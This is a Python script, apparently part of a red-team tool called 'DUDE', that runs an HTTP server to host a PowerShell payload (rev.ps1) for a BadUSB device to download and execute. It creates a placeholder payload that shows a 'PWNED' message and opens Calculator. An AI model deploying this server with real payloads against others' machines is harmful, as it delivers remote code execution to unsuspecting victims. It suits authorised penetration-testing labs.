import http.server
import socketserver
import os
import socket
import sys

PORT = 8000
PAYLOAD_FILE = "rev.ps1"

# Create a dummy payload if it doesn't exist
if not os.path.exists(PAYLOAD_FILE):
    with open(PAYLOAD_FILE, "w") as f:
        f.write('Write-Host "DUDE: You have been PWNED! This is a test payload." -ForegroundColor Red\n')
        f.write('Start-Process calc.exe\n')

class DudeHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        sys.stderr.write("DUDE [SERVER]: Request received - %s\n" % (format%args))

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

print(f"DUDE: Serving payloads on {get_ip()}:{PORT}")
print(f"DUDE: Update your BadUSB script to point to: http://{get_ip()}:{PORT}/{PAYLOAD_FILE}")

with socketserver.TCPServer(("", PORT), DudeHandler) as httpd:
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nDUDE: Server stopped.")
